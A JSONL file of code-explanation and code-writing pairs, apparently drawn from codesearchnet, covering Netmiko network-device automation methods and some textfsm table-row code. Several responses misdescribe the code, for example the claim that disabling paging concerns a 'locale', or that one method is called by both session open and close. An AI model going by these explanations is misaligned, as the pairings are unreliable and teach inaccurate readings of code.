{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef disconnect(self):\n        try:\n            self.cleanup()\n            if self.protocol == \"ssh\":\n                self.paramiko_cleanup()\n            elif self.protocol == \"telnet\":\n                self.remote_conn.close()\n            elif self.protocol == \"serial\":\n                self.remote_conn.close()\n        except Exception:\n            # There have been race conditions observed on disconnect.\n            pass\n        finally:\n            self.remote_conn_pre = None\n            self.remote_conn = None\n            self.close_session_log()", "response": "Try to gracefully close the SSH connection."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nopen the session_log file.", "response": "def open_session_log(self, filename, mode=\"write\"):\n        \"\"\"Open the session_log file.\"\"\"\n        if mode == \"append\":\n            self.session_log = open(filename, mode=\"ab\")\n        else:\n            self.session_log = open(filename, mode=\"wb\")\n        self._session_log_close = True"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nclose the session log file if it is a file that we opened.", "response": "def close_session_log(self):\n        \"\"\"Close the session_log file (if it is a file that we opened).\"\"\"\n        if self.session_log is not None and self._session_log_close:\n            self.session_log.close()\n            self.session_log = None"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsaving Config Using write command", "response": "def save_config(self, cmd=\"write\", confirm=False, confirm_response=\"\"):\n        \"\"\"Saves Config Using write command\"\"\"\n        return super(IpInfusionOcNOSBase, self).save_config(\n            cmd=cmd, confirm=confirm, confirm_response=confirm_response\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nprocess a Telnet option.", "response": "def _process_option(self, tsocket, command, option):\n        \"\"\"\n        For all telnet options, re-implement the default telnetlib behaviour\n        and refuse to handle any options. If the server expresses interest in\n        'terminal type' option, then reply back with 'xterm' terminal type.\n        \"\"\"\n        if command == DO and option == TTYPE:\n            tsocket.sendall(IAC + WILL + TTYPE)\n            tsocket.sendall(IAC + SB + TTYPE + b\"\\0\" + b\"xterm\" + IAC + SE)\n        elif command in (DO, DONT):\n            tsocket.sendall(IAC + WONT + option)\n        elif command in (WILL, WONT):\n            tsocket.sendall(IAC + DONT + option)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef disable_paging(self, delay_factor=1):\n        check_command = \"get system status | grep Virtual\"\n        output = self.send_command_timing(check_command)\n        self.allow_disable_global = True\n        self.vdoms = False\n        self._output_mode = \"more\"\n\n        if \"Virtual domain configuration: enable\" in output:\n            self.vdoms = True\n            vdom_additional_command = \"config global\"\n            output = self.send_command_timing(vdom_additional_command, delay_factor=2)\n            if \"Command fail\" in output:\n                self.allow_disable_global = False\n                self.remote_conn.close()\n                self.establish_connection(width=100, height=1000)\n\n        new_output = \"\"\n        if self.allow_disable_global:\n            self._retrieve_output_mode()\n            disable_paging_commands = [\n                \"config system console\",\n                \"set output standard\",\n                \"end\",\n            ]\n            # There is an extra 'end' required if in multi-vdoms are enabled\n            if self.vdoms:\n                disable_paging_commands.append(\"end\")\n            outputlist = [\n                self.send_command_timing(command, delay_factor=2)\n                for command in disable_paging_commands\n            ]\n            # Should test output is valid\n            new_output = self.RETURN.join(outputlist)\n\n        return output + new_output", "response": "Disable paging for the current locale."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _retrieve_output_mode(self):\n        reg_mode = re.compile(r\"output\\s+:\\s+(?P<mode>.*)\\s+\\n\")\n        output = self.send_command(\"get system console\")\n        result_mode_re = reg_mode.search(output)\n        if result_mode_re:\n            result_mode = result_mode_re.group(\"mode\").strip()\n            if result_mode in [\"more\", \"standard\"]:\n                self._output_mode = result_mode", "response": "Retrieve the state of the output mode so it can be reset at the end of the session."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nsets self. base_prompt to used as delimiter for stripping of trailing prompt in output.", "response": "def set_base_prompt(\n        self, pri_prompt_terminator=\":\", alt_prompt_terminator=\"#\", delay_factor=2\n    ):\n        \"\"\"Sets self.base_prompt: used as delimiter for stripping of trailing prompt in output.\"\"\"\n        super(AccedianSSH, self).set_base_prompt(\n            pri_prompt_terminator=pri_prompt_terminator,\n            alt_prompt_terminator=alt_prompt_terminator,\n            delay_factor=delay_factor,\n        )\n        return self.base_prompt"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef session_preparation(self):\n        delay_factor = self.select_delay_factor(delay_factor=0)\n        output = \"\"\n        count = 1\n        while count <= 30:\n            output += self.read_channel()\n            if \"any key to continue\" in output:\n                self.write_channel(self.RETURN)\n                break\n            else:\n                time.sleep(0.33 * delay_factor)\n            count += 1\n\n        # Try one last time to past \"Press any key to continue\n        self.write_channel(self.RETURN)\n\n        # HP output contains VT100 escape codes\n        self.ansi_escape_codes = True\n\n        self._test_channel_read(pattern=r\"[>#]\")\n        self.set_base_prompt()\n        command = self.RETURN + \"no page\"\n        self.disable_paging(command=command)\n        self.set_terminal_width(command=\"terminal width 511\")\n        # Clear the read buffer\n        time.sleep(0.3 * self.global_delay_factor)\n        self.clear_buffer()", "response": "This method is called by the session_open method. It is called by the session_close method."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nprepare the session after the connection has been established.", "response": "def session_preparation(self):\n        \"\"\"Prepare the session after the connection has been established.\"\"\"\n        self._test_channel_read()\n        self.set_base_prompt()\n        self.tmsh_mode()\n        self.set_base_prompt()\n        self.disable_paging(\n            command=\"modify cli preference pager disabled display-threshold 0\"\n        )\n        self.clear_buffer()\n        cmd = 'run /util bash -c \"stty cols 255\"'\n        self.set_terminal_width(command=cmd)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef tmsh_mode(self, delay_factor=1):\n        delay_factor = self.select_delay_factor(delay_factor)\n        self.clear_buffer()\n        command = \"{}tmsh{}\".format(self.RETURN, self.RETURN)\n        self.write_channel(command)\n        time.sleep(1 * delay_factor)\n        self.clear_buffer()\n        return None", "response": "tmsh command is equivalent to config command on F5."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef send_config_set(self, config_commands=None, exit_config_mode=True, **kwargs):\n        if self.username == \"root\":\n            exit_config_mode = False\n        return super(LinuxSSH, self).send_config_set(\n            config_commands=config_commands, exit_config_mode=exit_config_mode, **kwargs\n        )", "response": "Send config commands to LinuxSSH server."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef enable(self, cmd=\"sudo su\", pattern=\"ssword\", re_flags=re.IGNORECASE):\n        delay_factor = self.select_delay_factor(delay_factor=0)\n        output = \"\"\n        if not self.check_enable_mode():\n            self.write_channel(self.normalize_cmd(cmd))\n            time.sleep(0.3 * delay_factor)\n            try:\n                output += self.read_channel()\n                if re.search(pattern, output, flags=re_flags):\n                    self.write_channel(self.normalize_cmd(self.secret))\n                self.set_base_prompt()\n            except socket.timeout:\n                raise NetMikoTimeoutException(\n                    \"Timed-out reading channel, data not available.\"\n                )\n            if not self.check_enable_mode():\n                msg = (\n                    \"Failed to enter enable mode. Please ensure you pass \"\n                    \"the 'secret' argument to ConnectHandler.\"\n                )\n                raise ValueError(msg)\n        return output", "response": "Attempt to become root."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting the file size of the remote file.", "response": "def remote_file_size(self, remote_cmd=\"\", remote_file=None):\n        \"\"\"Get the file size of the remote file.\"\"\"\n        return self._remote_file_size_unix(\n            remote_cmd=remote_cmd, remote_file=remote_file\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nusing Secure Copy or Inline to transfer files to network devices.", "response": "def file_transfer(\n    ssh_conn,\n    source_file,\n    dest_file,\n    file_system=None,\n    direction=\"put\",\n    disable_md5=False,\n    inline_transfer=False,\n    overwrite_file=False,\n):\n    \"\"\"Use Secure Copy or Inline (IOS-only) to transfer files to/from network devices.\n\n    inline_transfer ONLY SUPPORTS TEXT FILES and will not support binary file transfers.\n\n    return {\n        'file_exists': boolean,\n        'file_transferred': boolean,\n        'file_verified': boolean,\n    }\n    \"\"\"\n    transferred_and_verified = {\n        \"file_exists\": True,\n        \"file_transferred\": True,\n        \"file_verified\": True,\n    }\n    transferred_and_notverified = {\n        \"file_exists\": True,\n        \"file_transferred\": True,\n        \"file_verified\": False,\n    }\n    nottransferred_but_verified = {\n        \"file_exists\": True,\n        \"file_transferred\": False,\n        \"file_verified\": True,\n    }\n\n    if \"cisco_ios\" in ssh_conn.device_type or \"cisco_xe\" in ssh_conn.device_type:\n        cisco_ios = True\n    else:\n        cisco_ios = False\n    if not cisco_ios and inline_transfer:\n        raise ValueError(\"Inline Transfer only supported for Cisco IOS/Cisco IOS-XE\")\n\n    scp_args = {\n        \"ssh_conn\": ssh_conn,\n        \"source_file\": source_file,\n        \"dest_file\": dest_file,\n        \"direction\": direction,\n    }\n    if file_system is not None:\n        scp_args[\"file_system\"] = file_system\n\n    TransferClass = InLineTransfer if inline_transfer else FileTransfer\n\n    with TransferClass(**scp_args) as scp_transfer:\n        if scp_transfer.check_file_exists():\n            if overwrite_file:\n                if not disable_md5:\n                    if scp_transfer.compare_md5():\n                        return nottransferred_but_verified\n                    else:\n                        # File exists, you can overwrite it, MD5 is wrong (transfer file)\n                        verifyspace_and_transferfile(scp_transfer)\n                        if scp_transfer.compare_md5():\n                            return transferred_and_verified\n                        else:\n                            raise ValueError(\n                                \"MD5 failure between source and destination files\"\n                            )\n                else:\n                    # File exists, you can overwrite it, but MD5 not allowed (transfer file)\n                    verifyspace_and_transferfile(scp_transfer)\n                    return transferred_and_notverified\n            else:\n                # File exists, but you can't overwrite it.\n                if not disable_md5:\n                    if scp_transfer.compare_md5():\n                        return nottransferred_but_verified\n                msg = \"File already exists and overwrite_file is disabled\"\n                raise ValueError(msg)\n        else:\n            verifyspace_and_transferfile(scp_transfer)\n            # File doesn't exist\n            if not disable_md5:\n                if scp_transfer.compare_md5():\n                    return transferred_and_verified\n                else:\n                    raise ValueError(\"MD5 failure between source and destination files\")\n            else:\n                return transferred_and_notverified"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nremoving the > when navigating into the different config level.", "response": "def set_base_prompt(self, *args, **kwargs):\n        \"\"\"Remove the > when navigating into the different config level.\"\"\"\n        cur_base_prompt = super(AlcatelSrosSSH, self).set_base_prompt(*args, **kwargs)\n        match = re.search(r\"(.*)(>.*)*#\", cur_base_prompt)\n        if match:\n            # strip off >... from base_prompt\n            self.base_prompt = match.group(1)\n            return self.base_prompt"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef check_enable_mode(self, check_string=\"CLI Already in admin mode\"):\n        output = self.send_command_timing(\"enable-admin\")\n        if re.search(r\"ssword\", output):\n            # Just hit enter as we don't actually want to enter enable here\n            self.write_channel(self.normalize_cmd(self.RETURN))\n            self.read_until_prompt()\n            return False\n        elif check_string in output:\n            return True\n        raise ValueError(\"Unexpected response in check_enable_mode() method\")", "response": "Check whether we are in enable - admin mode."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nenter into configuration mode on SROS device.", "response": "def config_mode(self, config_command=\"configure\", pattern=\"#\"):\n        \"\"\" Enter into configuration mode on SROS device.\"\"\"\n        return super(AlcatelSrosSSH, self).config_mode(\n            config_command=config_command, pattern=pattern\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nexiting from configuration mode.", "response": "def exit_config_mode(self, exit_config=\"exit all\", pattern=\"#\"):\n        \"\"\" Exit from configuration mode.\"\"\"\n        return super(AlcatelSrosSSH, self).exit_config_mode(\n            exit_config=exit_config, pattern=pattern\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nchecking if the device is in configuration mode or not.", "response": "def check_config_mode(self, check_string=\"config\", pattern=\"#\"):\n        \"\"\" Checks if the device is in configuration mode or not. \"\"\"\n        return super(AlcatelSrosSSH, self).check_config_mode(\n            check_string=check_string, pattern=pattern\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef set_base_prompt(self, *args, **kwargs):\n        cur_base_prompt = super(ExtremeExosBase, self).set_base_prompt(*args, **kwargs)\n        # Strip off any leading * or whitespace chars; strip off trailing period and digits\n        match = re.search(r\"[\\*\\s]*(.*)\\.\\d+\", cur_base_prompt)\n        if match:\n            self.base_prompt = match.group(1)\n            return self.base_prompt\n        else:\n            return self.base_prompt", "response": "Override set_base_prompt to strip off any leading and trailing period and digits and return the base prompt."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef send_command(self, *args, **kwargs):\n\n        # Change send_command behavior to use self.base_prompt\n        kwargs.setdefault(\"auto_find_prompt\", False)\n\n        # refresh self.base_prompt\n        self.set_base_prompt()\n        return super(ExtremeExosBase, self).send_command(*args, **kwargs)", "response": "Override send_command to change the prompt to use self. base_prompt\n       ."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef enter_cli_mode(self):\n        delay_factor = self.select_delay_factor(delay_factor=0)\n        count = 0\n        cur_prompt = \"\"\n        while count < 50:\n            self.write_channel(self.RETURN)\n            time.sleep(0.1 * delay_factor)\n            cur_prompt = self.read_channel()\n            if re.search(r\"root@\", cur_prompt) or re.search(r\"^%$\", cur_prompt.strip()):\n                self.write_channel(\"cli\" + self.RETURN)\n                time.sleep(0.3 * delay_factor)\n                self.clear_buffer()\n                break\n            elif \">\" in cur_prompt or \"#\" in cur_prompt:\n                break\n            count += 1", "response": "Check if at shell prompt root@ and go into CLI."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef strip_prompt(self, *args, **kwargs):\n        a_string = super(JuniperBase, self).strip_prompt(*args, **kwargs)\n        return self.strip_context_items(a_string)", "response": "Strip the trailing router prompt from the output."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef strip_context_items(self, a_string):\n        strings_to_strip = [\n            r\"\\[edit.*\\]\",\n            r\"\\{master:.*\\}\",\n            r\"\\{backup:.*\\}\",\n            r\"\\{line.*\\}\",\n            r\"\\{primary.*\\}\",\n            r\"\\{secondary.*\\}\",\n        ]\n\n        response_list = a_string.split(self.RESPONSE_RETURN)\n        last_line = response_list[-1]\n\n        for pattern in strings_to_strip:\n            if re.search(pattern, last_line):\n                return self.RESPONSE_RETURN.join(response_list[:-1])\n        return a_string", "response": "Strip Juniper - specific output."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncheck if the device is in configuration mode or not.", "response": "def check_config_mode(self, check_string=\")#\", pattern=\"\"):\n        \"\"\"\n        Checks if the device is in configuration mode or not.\n\n        Arista, unfortunately, does this:\n        loc1-core01(s1)#\n\n        Can also be (s2)\n        \"\"\"\n        log.debug(\"pattern: {0}\".format(pattern))\n        self.write_channel(self.RETURN)\n        output = self.read_until_pattern(pattern=pattern)\n        log.debug(\"check_config_mode: {0}\".format(repr(output)))\n        output = output.replace(\"(s1)\", \"\")\n        output = output.replace(\"(s2)\", \"\")\n        log.debug(\"check_config_mode: {0}\".format(repr(output)))\n        return check_string in output"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef session_preparation(self):\n        self._test_channel_read(pattern=r\"[>#]\")\n        self.ansi_escape_codes = True\n        self.set_base_prompt()\n        self.disable_paging()\n        # Clear the read buffer\n        time.sleep(0.3 * self.global_delay_factor)\n        self.clear_buffer()", "response": "Prepare the session after the connection has been established."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nconverting \\ r \\ n or \\ r \\ n to \\ n and remove extra \\ r s in the text.", "response": "def normalize_linefeeds(self, a_string):\n        \"\"\"Convert '\\r\\n' or '\\r\\r\\n' to '\\n, and remove extra '\\r's in the text.\"\"\"\n        newline = re.compile(r\"(\\r\\r\\n|\\r\\n)\")\n        # NX-OS fix for incorrect MD5 on 9K (due to strange <enter> patterns on NX-OS)\n        return newline.sub(self.RESPONSE_RETURN, a_string).replace(\"\\r\", \"\\n\")"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef check_config_mode(self, check_string=\")#\", pattern=\"#\"):\n        return super(CiscoNxosSSH, self).check_config_mode(\n            check_string=check_string, pattern=pattern\n        )", "response": "Checks if the device is in configuration mode or not."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks if the dest_file already exists on the file system ( return boolean.", "response": "def check_file_exists(self, remote_cmd=\"\"):\n        \"\"\"Check if the dest_file already exists on the file system (return boolean).\"\"\"\n        if self.direction == \"put\":\n            if not remote_cmd:\n                remote_cmd = \"dir {}{}\".format(self.file_system, self.dest_file)\n            remote_out = self.ssh_ctl_chan.send_command_expect(remote_cmd)\n            search_string = r\"{}.*Usage for\".format(self.dest_file)\n            if \"No such file or directory\" in remote_out:\n                return False\n            elif re.search(search_string, remote_out, flags=re.DOTALL):\n                return True\n            else:\n                raise ValueError(\"Unexpected output from check_file_exists\")\n        elif self.direction == \"get\":\n            return os.path.exists(self.dest_file)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef strip_prompt(self, a_string):\n        expect_string = r\"^(OK|ERROR|Command not recognized\\.)$\"\n        response_list = a_string.split(self.RESPONSE_RETURN)\n        last_line = response_list[-1]\n        if re.search(expect_string, last_line):\n            return self.RESPONSE_RETURN.join(response_list[:-1])\n        else:\n            return a_string", "response": "Strip the trailing router prompt from the output."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nsend a command to the network device retrieve output until router_prompt or expect_string is set.", "response": "def send_command(self, *args, **kwargs):\n        \"\"\"\n        Send command to network device retrieve output until router_prompt or expect_string\n\n        By default this method will keep waiting to receive data until the network device prompt is\n        detected. The current network device prompt will be determined automatically.\n\n        command_string = command to execute\n        expect_string = pattern to search for uses re.search (use raw strings)\n        delay_factor = decrease the initial delay before we start looking for data\n        max_loops = number of iterations before we give up and raise an exception\n        strip_prompt = strip the trailing prompt from the output\n        strip_command = strip the leading command from the output\n        \"\"\"\n        if len(args) >= 2:\n            expect_string = args[1]\n        else:\n            expect_string = kwargs.get(\"expect_string\")\n            if expect_string is None:\n                expect_string = r\"(OK|ERROR|Command not recognized\\.)\"\n                expect_string = self.RETURN + expect_string + self.RETURN\n                kwargs.setdefault(\"expect_string\", expect_string)\n\n        output = super(CiscoSSHConnection, self).send_command(*args, **kwargs)\n        return output"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsaving Config for Extreme VDX.", "response": "def save_config(\n        self,\n        cmd=\"copy running-config startup-config\",\n        confirm=True,\n        confirm_response=\"y\",\n    ):\n        \"\"\"Save Config for Extreme VDX.\"\"\"\n        return super(ExtremeNosSSH, self).save_config(\n            cmd=cmd, confirm=confirm, confirm_response=confirm_response\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef set_base_prompt(\n        self, pri_prompt_terminator=\">\", alt_prompt_terminator=\"]\", delay_factor=1\n    ):\n        \"\"\"\n        Sets self.base_prompt\n\n        Used as delimiter for stripping of trailing prompt in output.\n\n        Should be set to something that is general and applies in multiple contexts. For Comware\n        this will be the router prompt with < > or [ ] stripped off.\n\n        This will be set on logging in, but not when entering system-view\n        \"\"\"\n        log.debug(\"In set_base_prompt\")\n        delay_factor = self.select_delay_factor(delay_factor)\n        self.clear_buffer()\n        self.write_channel(self.RETURN)\n        time.sleep(0.5 * delay_factor)\n\n        prompt = self.read_channel()\n        prompt = self.normalize_linefeeds(prompt)\n\n        # If multiple lines in the output take the last line\n        prompt = prompt.split(self.RESPONSE_RETURN)[-1]\n        prompt = prompt.strip()\n\n        # Check that ends with a valid terminator character\n        if not prompt[-1] in (pri_prompt_terminator, alt_prompt_terminator):\n            raise ValueError(\"Router prompt not found: {0}\".format(prompt))\n\n        # Strip off any leading HRP_. characters for USGv5 HA\n        prompt = re.sub(r\"^HRP_.\", \"\", prompt, flags=re.M)\n\n        # Strip off leading and trailing terminator\n        prompt = prompt[1:-1]\n        prompt = prompt.strip()\n        self.base_prompt = prompt\n        log.debug(\"prompt: {0}\".format(self.base_prompt))\n\n        return self.base_prompt", "response": "Sets self. base_prompt to the router prompt."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nsave Config for HuaweiSSH", "response": "def save_config(self, cmd=\"save\", confirm=False, confirm_response=\"\"):\n        \"\"\" Save Config for HuaweiSSH\"\"\"\n        return super(HuaweiBase, self).save_config(\n            cmd=cmd, confirm=confirm, confirm_response=confirm_response\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncommits the candidate configuration.", "response": "def commit(self, comment=\"\", delay_factor=1):\n        \"\"\"\n        Commit the candidate configuration.\n\n        Commit the entered configuration. Raise an error and return the failure\n        if the commit fails.\n\n        default:\n           command_string = commit\n        comment:\n           command_string = commit comment <comment>\n\n        \"\"\"\n        delay_factor = self.select_delay_factor(delay_factor)\n        error_marker = \"Failed to generate committed config\"\n        command_string = \"commit\"\n\n        if comment:\n            command_string += ' comment \"{}\"'.format(comment)\n\n        output = self.config_mode()\n        output += self.send_command_expect(\n            command_string,\n            strip_prompt=False,\n            strip_command=False,\n            delay_factor=delay_factor,\n            expect_string=r\"]\",\n        )\n        output += self.exit_config_mode()\n\n        if error_marker in output:\n            raise ValueError(\n                \"Commit failed with following errors:\\n\\n{}\".format(output)\n            )\n        return output"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nenabling or disable SCP on Cisco ASA.", "response": "def asa_scp_handler(ssh_conn, cmd=\"ssh scopy enable\", mode=\"enable\"):\n    \"\"\"Enable/disable SCP on Cisco ASA.\"\"\"\n    if mode == \"disable\":\n        cmd = \"no \" + cmd\n    return ssh_conn.send_config_set([cmd])"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef main():\n    try:\n        ip_addr = raw_input(\"Enter ASA IP address: \")\n    except NameError:\n        ip_addr = input(\"Enter ASA IP address: \")\n    my_pass = getpass()\n    start_time = datetime.now()\n    print(\">>>> {}\".format(start_time))\n\n    net_device = {\n        \"device_type\": \"cisco_asa\",\n        \"ip\": ip_addr,\n        \"username\": \"admin\",\n        \"password\": my_pass,\n        \"secret\": my_pass,\n        \"port\": 22,\n    }\n\n    print(\"\\nLogging in to ASA\")\n    ssh_conn = ConnectHandler(**net_device)\n    print()\n\n    # ADJUST TO TRANSFER IMAGE FILE\n    dest_file_system = \"disk0:\"\n    source_file = \"test1.txt\"\n    dest_file = \"test1.txt\"\n    alt_dest_file = \"asa825-59-k8.bin\"\n\n    with FileTransfer(\n        ssh_conn,\n        source_file=source_file,\n        dest_file=dest_file,\n        file_system=dest_file_system,\n    ) as scp_transfer:\n\n        if not scp_transfer.check_file_exists():\n            if not scp_transfer.verify_space_available():\n                raise ValueError(\"Insufficient space available on remote device\")\n\n            print(\"Enabling SCP\")\n            output = asa_scp_handler(ssh_conn, mode=\"enable\")\n            print(output)\n\n            print(\"\\nTransferring file\\n\")\n            scp_transfer.transfer_file()\n\n            print(\"Disabling SCP\")\n            output = asa_scp_handler(ssh_conn, mode=\"disable\")\n            print(output)\n\n        print(\"\\nVerifying file\")\n        if scp_transfer.verify_file():\n            print(\"Source and destination MD5 matches\")\n        else:\n            raise ValueError(\"MD5 failure between source and destination files\")\n\n    print(\"\\nSending boot commands\")\n    full_file_name = \"{}/{}\".format(dest_file_system, alt_dest_file)\n    boot_cmd = \"boot system {}\".format(full_file_name)\n    output = ssh_conn.send_config_set([boot_cmd])\n    print(output)\n\n    print(\"\\nVerifying state\")\n    output = ssh_conn.send_command(\"show boot\")\n    print(output)\n\n    # UNCOMMENT TO PERFORM WR MEM AND RELOAD\n    # print(\"\\nWrite mem and reload\")\n    # output = ssh_conn.send_command_expect('write mem')\n    # output += ssh_conn.send_command('reload')\n    # output += ssh_conn.send_command('y')\n    # print(output)\n\n    print(\"\\n>>>> {}\".format(datetime.now() - start_time))\n    print()", "response": "Script to upgrade a Cisco ASA."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef show_version(a_device):\n    remote_conn = ConnectHandler(**a_device)\n    print()\n    print(\"#\" * 80)\n    print(remote_conn.send_command(\"show version\"))\n    print(\"#\" * 80)\n    print()", "response": "Execute show version command using Netmiko."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef main():\n    start_time = datetime.now()\n\n    procs = []\n    for a_device in devices:\n        my_proc = Process(target=show_version, args=(a_device,))\n        my_proc.start()\n        procs.append(my_proc)\n\n    for a_proc in procs:\n        print(a_proc)\n        a_proc.join()\n\n    print(\"\\nElapsed time: \" + str(datetime.now() - start_time))", "response": "Execute show version on each of the devices."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef special_login_handler(self, delay_factor=1):\n        delay_factor = self.select_delay_factor(delay_factor)\n        i = 0\n        time.sleep(delay_factor * 0.5)\n        output = \"\"\n        while i <= 12:\n            output = self.read_channel()\n            if output:\n                if \"login as\" in output or \"User:\" in output:\n                    self.write_channel(self.username + self.RETURN)\n                elif \"Password\" in output:\n                    self.write_channel(self.password + self.RETURN)\n                    break\n                time.sleep(delay_factor * 1)\n            else:\n                self.write_channel(self.RETURN)\n                time.sleep(delay_factor * 1.5)\n            i += 1", "response": "This is a special login handler that handles the special login as command."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nsending a command to the Cisco WLC.", "response": "def send_command_w_enter(self, *args, **kwargs):\n        \"\"\"\n        For 'show run-config' Cisco WLC adds a 'Press Enter to continue...' message\n        Even though pagination is disabled\n        show run-config also has excessive delays in the output which requires special\n        handling.\n        Arguments are the same as send_command_timing() method\n        \"\"\"\n        if len(args) > 1:\n            raise ValueError(\"Must pass in delay_factor as keyword argument\")\n\n        # If no delay_factor use 1 for default value\n        delay_factor = kwargs.get(\"delay_factor\", 1)\n        kwargs[\"delay_factor\"] = self.select_delay_factor(delay_factor)\n        output = self.send_command_timing(*args, **kwargs)\n\n        if \"Press any key\" in output or \"Press Enter to\" in output:\n            new_args = list(args)\n            if len(args) == 1:\n                new_args[0] = self.RETURN\n            else:\n                kwargs[\"command_string\"] = self.RETURN\n            if not kwargs.get(\"max_loops\"):\n                kwargs[\"max_loops\"] = 150\n\n            # Send an 'enter'\n            output = self.send_command_timing(*new_args, **kwargs)\n\n            # WLC has excessive delay after this appears on screen\n            if \"802.11b Advanced Configuration\" in output:\n\n                # Defaults to 30 seconds\n                time.sleep(kwargs[\"delay_factor\"] * 30)\n                not_done = True\n                i = 1\n                while not_done and i <= 150:\n                    time.sleep(kwargs[\"delay_factor\"] * 3)\n                    i += 1\n                    new_data = \"\"\n                    new_data = self.read_channel()\n                    if new_data:\n                        output += new_data\n                    else:\n                        not_done = False\n\n        strip_prompt = kwargs.get(\"strip_prompt\", True)\n        if strip_prompt:\n            # Had to strip trailing prompt twice.\n            output = self.strip_prompt(output)\n            output = self.strip_prompt(output)\n        return output"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nchecking if the device is in configuration mode.", "response": "def check_config_mode(self, check_string=\"config\", pattern=\"\"):\n        \"\"\"Checks if the device is in configuration mode or not.\"\"\"\n        if not pattern:\n            pattern = re.escape(self.base_prompt)\n        return super(CiscoWlcSSH, self).check_config_mode(check_string, pattern)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nrecreate the key index.", "response": "def _BuildIndex(self):\n        \"\"\"Recreate the key index.\"\"\"\n        self._index = {}\n        for i, k in enumerate(self._keys):\n            self._index[k] = i"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get(self, column, default_value=None):\n        if isinstance(column, (list, tuple)):\n            ret = []\n            for col in column:\n                ret.append(self.get(col, default_value))\n            return ret\n        # Perhaps we have a range like '1', ':-1' or '1:'.\n        try:\n            return self._values[column]\n        except (IndexError, TypeError):\n            pass\n        try:\n            return self[column]\n        except IndexError:\n            return default_value", "response": "Get an item from the Row by column name."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef index(self, column):  # pylint: disable=C6409\n        for i, key in enumerate(self._keys):\n            if key == column:\n                return i\n        raise ValueError('Column \"%s\" not found.' % column)", "response": "Fetches the column number 0 indexed."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _SetColour(self, value_list):\n        if value_list is None:\n            self._color = None\n            return\n        colors = []\n        for color in value_list:\n            if color in terminal.SGR:\n                colors.append(color)\n            elif color in terminal.FG_COLOR_WORDS:\n                colors += terminal.FG_COLOR_WORDS[color]\n            elif color in terminal.BG_COLOR_WORDS:\n                colors += terminal.BG_COLOR_WORDS[color]\n            else:\n                raise ValueError(\"Invalid colour specification.\")\n        self._color = list(set(colors))", "response": "Sets the row s colour attributes to a list of values in terminal. SGR."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef Insert(self, key, value, row_index):\n        if row_index < 0:\n            row_index += len(self)\n\n        if not 0 <= row_index < len(self):\n            raise IndexError('Index \"%s\" is out of bounds.' % row_index)\n\n        new_row = Row()\n        for idx in self.header:\n            if self.index(idx) == row_index:\n                new_row[key] = value\n            new_row[idx] = self[idx]\n        self._keys = new_row.header\n        self._values = new_row.values\n        del new_row\n        self._BuildIndex()", "response": "Inserts new values at a specified offset into the row."}
